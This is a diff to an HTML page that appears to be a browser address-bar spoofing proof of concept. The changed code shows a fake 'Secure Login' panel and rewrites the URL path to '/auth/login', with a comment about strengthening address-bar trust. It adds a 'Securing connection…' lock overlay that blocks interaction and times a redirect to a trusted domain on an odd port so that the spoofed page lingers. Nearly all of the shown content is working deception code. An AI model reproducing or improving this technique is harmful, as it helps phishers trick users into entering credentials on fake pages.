@@ -10,6 +10,13 @@
     font-family: -apple-system, BlinkMacSystemFont, system-ui;
     background: #f5f5f7;
   }
+
+  button {
+    margin: 40px;
+    font-size: 18px;
+    padding: 10px 18px;
+  }
+
   #panel {
     display: none;
     padding: 24px;
@@ -18,14 +25,13 @@
     background: #fff;
     border-radius: 14px;
     box-shadow: 0 20px 60px rgba(0,0,0,.15);
+    position: relative;
+    z-index: 1;
   }
-  h2 {
-    margin: 0 0 8px;
-  }
-  .sub {
-    color: #666;
-    margin-bottom: 20px;
-  }
+
+  h2 { margin: 0 0 8px; }
+  .sub { color: #666; margin-bottom: 20px; }
+
   .spinner {
     width: 28px;
     height: 28px;
@@ -34,21 +40,47 @@
     border-radius: 50%;
     animation: spin 1s linear infinite;
   }
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
   #timer {
     margin-top: 16px;
     font-weight: 600;
+  }
+
+  /* ===== FREEZE OVERLAY ===== */
+  #freeze {
+    position: fixed;
+    inset: 0;
+    background: rgba(255,255,255,0.96);
+    display: none;
+    z-index: 9999;
+    pointer-events: all;
+  }
+
+  #freeze .box {
+    position: absolute;
+    top: 45%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+  }
+
+  #freeze .lock {
+    font-size: 42px;
+    margin-bottom: 12px;
+  }
+
+  #freeze .text {
+    font-size: 16px;
+    color: #333;
   }
 </style>
 </head>
 
 <body>
 
-<button id="trigger" style="margin:40px;font-size:18px;">
-  Continue
-</button>
+<button id="trigger">Continue</button>
 
 <div id="panel">
   <h2>Secure Login</h2>
@@ -57,36 +89,47 @@
   <div id="timer">0 ms</div>
 </div>
 
+<!-- FREEZE OVERLAY -->
+<div id="freeze">
+  <div class="box">
+    <div class="lock">🔒</div>
+    <div class="text">Securing connection…</div>
+  </div>
+</div>
+
 <script>
 document.getElementById('trigger').addEventListener('click', () => {
-  const panel = document.getElementById('panel');
-  const timer = document.getElementById('timer');
+  const panel  = document.getElementById('panel');
+  const timer  = document.getElementById('timer');
+  const freeze = document.getElementById('freeze');
 
-  // strengthen address bar trust
+  // Strengthen address bar trust
   history.pushState({}, '', '/auth/login');
 
   panel.style.display = 'block';
+
+  // Fake freeze (non-blocking)
+  freeze.style.display = 'block';
+  document.body.style.pointerEvents = 'none';
 
   const start = performance.now();
   let rafId;
 
   function tick() {
-    timer.textContent =
-      Math.round(performance.now() - start) + ' ms';
+    timer.textContent = Math.round(performance.now() - start) + ' ms';
     rafId = requestAnimationFrame(tick);
   }
 
-  // paint confirmation (WebKit-friendly)
+  // Paint confirmed (WebKit-friendly)
   requestAnimationFrame(() => {
     requestAnimationFrame(tick);
   });
 
-  // microtask chain (safe limit)
+  // Microtask chain (safe limit) + RAF-synced redirect
   Promise.resolve()
     .then(() => Promise.resolve())
     .then(() => Promise.resolve())
     .then(() => {
-      // sync redirect with next paint
       requestAnimationFrame(() => {
         cancelAnimationFrame(rafId);
         location.href = 'https://google.com:9090';
